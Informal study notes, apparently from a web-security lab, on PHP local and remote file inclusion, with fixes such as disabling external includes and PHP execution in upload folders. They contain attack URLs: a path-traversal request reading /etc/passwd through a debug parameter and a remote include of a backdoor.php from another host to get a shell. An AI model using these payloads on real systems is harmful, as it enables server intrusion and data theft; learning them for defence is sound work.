Local file inclusion
Remote file inclusion
it's like loading a library
Include a file in another php file
take content of included file and put it in original file
cd /var/www/html/ii/wp-admin$ 
vi user-edit.php
colo evening
/include
app is vulnerable if attacker can manipulate which file gets included in the website

!--FIXME remove the debug_param before going to production -->
http://192.168.56.3/ii/?debug_param=test
192.168.56.3/ii/?debug_param=readme.html
we get broken page but means we have local file inclusion
we can extract data from the server
http://192.168.56.3/ii/?debug_param=../../../../../../../../etc/passwd
on the server
cat ../../../../../../../etc/passwd
including file from the internet and including that in php code
http://192.168.56.4/backdoor.php
cd /var/www/html
vim .htaccess
php_flag engine off

vim /etc/apache2/apache2.conf
AllowOverride All
service apache2 restart
Disabled php execution above

remote comm exec on server 
rfi we dont need rights to upload files
lfi inclusion we could still get shell access we can only do that if we have a user to log in loged in to be able to upload php file
rfi no need to upload file
anybody with access to main bridge can do shell access incrase risk of vulnerability
TO FIX
DONT USE user supplied data in file includes
or make sure input data is validates before parsing it to include function
also against rfi configure php not to allow external includes
def config of php
